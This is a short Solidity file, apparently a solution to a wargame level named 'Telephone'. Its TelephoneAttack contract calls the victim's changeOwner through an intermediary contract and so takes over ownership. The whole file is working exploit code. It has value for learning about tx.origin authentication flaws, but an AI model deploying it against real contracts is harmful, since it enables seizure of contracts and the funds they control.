// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone victimContract;

    constructor(address _victimContractAddress) public {
        victimContract = Telephone(_victimContractAddress);
    }

    function attack() public {
        victimContract.changeOwner(msg.sender);
    }
}
